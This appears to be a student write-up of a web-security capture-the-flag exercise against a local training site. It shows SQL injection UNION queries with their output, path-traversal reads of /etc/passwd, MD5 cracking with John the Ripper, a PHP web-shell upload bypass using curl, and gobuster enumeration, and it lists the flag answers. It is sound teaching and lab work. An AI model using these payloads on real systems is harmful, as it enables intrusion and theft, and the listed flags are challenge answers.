### This is a project that is meant as an intro to web security in the form of a CTF challenge where we need to find 14 flags

### Flag 00 03A944B434D5BAFF05F46C4BEDE5792551A2595574BCAFC9A6E25F67C382CCAA SERVER SIDE VALIDATION

### Flag 01 10A16D834F9B1E4068B25C4C46FE0284E99E44DCEAF08098FC83925BA6310FF5 SQL INJECTION

### Flag 02 1D4855F7337C0C14B6F44946872C4EB33853F40B2D54393FBE94F49F1E19BBB0 VALIDATION-BYPASS, NEED SERVER SIDE VALIDATION

### Flag 03 0FBB54BBF7D099713CA4BE297E1BC7DA0173D8B3C21C1811B916A3A86652724E this one we will never know what the vulnerability was ?? click on a button i guess

### Flag 04 f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188 Referrer-Based Access Control Bypass and User-Agent Manipulation

### Flag 05 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d XSS, Cross site scripting

### Flag 06 b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 bruteforce

### Flag 07 df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3 Weak Hash-based Authentication Bypass

### Flag 08 d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff

How to defend: Assume everything can be found and implement proper needed auth, also dont use weak hashing like MD5 & better password policy

found this dir using gobuster

http://localhost:8080/whatever/

there is a htpasswd file containing

```

`root:437394baff5aa33daa618be47b75cb49`

```

Seems to be hashed in md5, we cracked the password using John the Ripper:

```bash
../john/run/john --format=Raw-MD5 htpasswd
```

gives us the password

```
Enabling duplicate candidate password suppressor
qwerty123@       (root)
```

so now we can connect to this page which we also found through gobuster

http://localhost:8080/admin/

using root as username and qwerty123@ as password, which gets us the flag

### FLAG 09 b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 LOCAL FILE INCLUSION

How to defend: Always validate and sanitize user inputs, sensitive files should need privileged/admin access, use a web application firewall

http://localhost:8080/index.php?page=../../../../etc/passwd

ALMOST

http://localhost:8080/index.php?page=../../../../../var/log/httpd/access.log

STILL NOPE

and a bunch more until

http://localhost:8080/index.php?page=../../../../../../../etc/passwd

which gives us

```
Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
```

### FLAG 10 F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188 SQL INJECTION

How to defend:

SEARCH IMAGE, IMAGE NUMBER 5

comes up to

```
ID: 5
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

going for sql injections : 5 OR 1=1--
gives

```
ID: 5 OR 1=1--
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 5 OR 1=1--
Title: 42 !
Url : https://fr.wikipedia.org/wiki/Fichier:42

ID: 5 OR 1=1--
Title: Google
Url : https://fr.wikipedia.org/wiki/Logo_de_Go

ID: 5 OR 1=1--
Title: Earth
Url : https://en.wikipedia.org/wiki/Earth#/med

ID: 5 OR 1=1--
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

vulnerable to sql injections even though it doesnt return errors

this gives us what tables we have access to

```
ID: -1 UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=DATABASE()--
Title: list_images
Url :
```

which is list_images

listing the values in list_images

```
ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
Title: id
Url :

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
Title: url
Url :

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
Title: title
Url :

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
Title: comment
Url :
```

we see an interesting thing, the comment

and fetching the values gives us

```
ID: 6 UNION SELECT title, comment FROM list_images--
Title: An image about the NSA !
Url : Nsa

ID: 6 UNION SELECT title, comment FROM list_images--
Title: There is a number..
Url : 42 !

ID: 6 UNION SELECT title, comment FROM list_images--
Title: Google it !
Url : Google

ID: 6 UNION SELECT title, comment FROM list_images--
Title: Earth!
Url : Earth

ID: 6 UNION SELECT title, comment FROM list_images--
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

using john

```
darklyProject git:(master) ✗ ../john/run/john --format=Raw-MD5 comment
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=20
Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Warning: Only 22 candidates buffered for the current salt, minimum 24 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE 1/3 (2024-11-26 19:24) 0g/s 8564p/s 8564c/s 8564C/s Getflag1905..Getflag1900
Proceeding with wordlist:../john/run/password.lst
Enabling duplicate candidate password suppressor
albatroz         (GetFlag)
1g 0:00:00:00 DONE 2/3 (2024-11-26 19:24) 2.703g/s 645318p/s 645318c/s 645318C/s billy420..sylveste
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

albatroz to sha256 gives us : F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188

### FLAG 11 b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3

there is a bunch of redirect links at the bottom to twitter, instagram and so on

we can just modify the query from

```
http://localhost:8080/index.php?page=redirect&site=instagram
```

to anything

```
http://localhost:8080/index.php?page=redirect&site=ifoundavulnerability
```

and we get a flag

## FLAG 12 d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466

gobuster gave us robots.txt
which says to hid /whatever (already got the flag there) and /.hidden

there is a bunch of files and dir in /.hidden

tried to see if there was any meaning to the names of the dir and files but nothing
all files have a readme which taunts us like "Try again"

so we need to make a crawler, which we do and search for keyword flag and it works the first time, we could also have just removed all the few special messages
in the other readmes, or search by size but flag works

and we get

```
Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
```

in http://localhost:8080/.hidden/whtccjokayshttvxycsvykxcfm/igeemtxnvexvxezqwntmzjltkt/lmpanswobhwcozdqixbowvbrhw/README

## FLAG 13 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8 SERVER SIDE VALIDATION

ADD IMAGE page

after trying a bunch of things, we can see that the server accepts .jpg files

and returns for example

```
/tmp/test.jpg succesfully uploaded.
```

however the image is not in the db we have access to through search img, not in the front page, there isn't a tmp dir we can reach
we also can't use local file inclusion to reach it

so even though the .jpg can technically be a script we could run there is nowhere we can reach it

however when uploading

```
<?php system($_GET['cmd']); ?>.jpg
```

we get back

```
/tmp/.jpg succesfully uploaded.
```

but that was not the vulnerability that we were supposed to find,

this works though

```
➜  darklyProject git:(master) ✗ curl -X POST 'http://localhost:8080/index.php?page=upload#' \
-H 'Content-Type: multipart/form-data' \
-F 'uploaded=@test.php;type=image/jpeg' \
-F 'MAX_FILE_SIZE=100000' \
-F 'Upload=Upload'
```

basically just sending the POST request with a .php file but setting the type as jpeg

and we get

```
>The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/test.php succesfully uploaded.</pre>
```

### TO NOTE

➜ utenret gobuster dir -u http://localhost:8080/ -w KaliLists/dirb/big.txt -b 200,975

```
➜  darklyProject git:(master) ✗ gobuster dir -u http://localhost:8080/ -w ../KaliLists/dirb/big.txt --exclude-length 975

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://localhost:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ../KaliLists/dirb/big.txt
[+] Negative Status codes:   404
[+] Exclude Length:          975
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 193] [--> http://localhost/admin/]
/audio                (Status: 301) [Size: 193] [--> http://localhost/audio/]
/css                  (Status: 301) [Size: 193] [--> http://localhost/css/]
/errors               (Status: 301) [Size: 193] [--> http://localhost/errors/]
/favicon.ico          (Status: 200) [Size: 1406]
/fonts                (Status: 301) [Size: 193] [--> http://localhost/fonts/]
/images               (Status: 301) [Size: 193] [--> http://localhost/images/]
/includes             (Status: 301) [Size: 193] [--> http://localhost/includes/]
/js                   (Status: 301) [Size: 193] [--> http://localhost/js/]
/robots.txt           (Status: 200) [Size: 53]
/whatever             (Status: 301) [Size: 193] [--> http://localhost/whatever/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================

```

```
darklyProject git:(master) ✗ gobuster dir -u http://localhost:8080/images/ -w ../KaliLists/dirbuster/directory-list-lowercase-2.3-medium.txt -x jpg,png,gif --exclude-length 975

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://localhost:8080/images/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ../KaliLists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          975
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,png,gif
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/search.png           (Status: 200) [Size: 49089]
/banner.jpg           (Status: 200) [Size: 511270]
/upload.png           (Status: 200) [Size: 64785]
/win.png              (Status: 200) [Size: 72726]
/win.jpg              (Status: 200) [Size: 43468]
/banner2.jpg          (Status: 200) [Size: 50867]
/404.jpg              (Status: 200) [Size: 27027]
/banner1.jpg          (Status: 200) [Size: 391182]
/nsa.png              (Status: 200) [Size: 133243]
/mailbox.png          (Status: 200) [Size: 49480]
/marvin.jpg           (Status: 200) [Size: 111300]
/search_img.png       (Status: 200) [Size: 17185]
/whoami.gif           (Status: 200) [Size: 1809804]
Progress: 830572 / 830576 (100.00%)
===============================================================
Finished
===============================================================
```
